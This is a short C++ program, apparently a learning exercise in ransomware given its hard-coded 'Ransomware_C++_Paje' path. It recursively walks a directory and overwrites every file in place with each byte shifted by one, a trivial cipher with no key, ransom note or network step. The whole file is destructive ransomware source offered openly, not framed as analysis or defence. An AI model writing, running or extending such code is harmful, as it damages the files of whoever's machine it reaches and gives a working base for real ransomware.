#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>

void encryptFile(std::string filePath) {
    std::fstream file, tempFile;
    std::string tempFilePath = "temp.txt";

    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    char byte;
    while (file.get(byte)) {
        byte += 1;
        tempFile << byte;
    }
    file.close();
    tempFile.close();

    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);

    while (tempFile.get(byte)) {
        file << byte;
    }
    file.close();
    tempFile.close();

    remove(tempFilePath.c_str());
}

void encryptDirectory(std::string directoryPath) {
    DIR* directory;
    struct dirent* entry;
    struct stat status;
    std::string path;

    if ((directory = opendir(directoryPath.c_str())) != NULL) {
        while ((entry = readdir(directory)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                path = directoryPath + "/" + entry->d_name;
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) {
                    encryptDirectory(path);
                } else {
                    encryptFile(path);
                }
            }
        }
        closedir(directory);
    }
}

int main() {
    encryptDirectory("C:/Ransomware_C++_Paje/Data");
    return 0;
}
